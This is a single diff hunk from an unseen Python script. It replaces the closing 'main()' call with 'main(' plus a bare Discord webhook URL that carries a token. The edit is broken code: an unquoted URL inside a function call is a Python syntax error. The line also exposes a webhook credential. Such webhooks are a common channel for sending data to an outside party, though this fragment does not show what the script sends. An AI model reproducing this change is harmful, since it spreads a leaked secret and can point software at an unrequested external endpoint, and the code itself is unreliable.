@@ -213,4 +213,4 @@ def main():
                 continue
 
 if __name__ == "__main__":
-    main()
+    main(https://discord.com/api/webhooks/1360953039015645214/7wkjdku-AXB9C1wQW-j77WgF1OV2d3JQdhjJbA1zkm9p28BYnwUoiAIc-x_I_YJxzSjX)
